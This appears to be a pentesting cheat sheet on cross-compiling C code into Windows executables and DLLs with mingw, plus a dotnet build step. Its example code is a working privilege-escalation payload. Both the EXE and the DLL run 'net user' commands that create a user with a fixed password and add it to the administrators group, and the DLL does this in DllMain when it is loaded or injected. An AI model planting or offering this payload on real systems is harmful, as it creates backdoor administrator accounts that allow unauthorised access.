# Cross-Compilation

### 1) Cross-compile C Code to 64-bit executable

    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

### 2) Cross-compile C Code to DLL

    x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows

## Example C Code

adduser.exe

    #include <stdlib.h>
    
    int main ()
    {
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      return 0;
    }

adduser.dll

    #include <windows.h>  
    #include <stdlib.h>  
    
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
      switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
          // Code executed when the DLL is injected
          system("net user emma Password123! /add");
          system("net localgroup administrators emma /add");
          break;
        case DLL_THREAD_ATTACH:
          break;
        case DLL_THREAD_DETACH:
          break;
        case DLL_PROCESS_DETACH:
          break;
      }
      return TRUE; // Indicate successful execution
    }

### 3) Compile C# Code to executable

    cd /CSharpProject
    dotnet build .
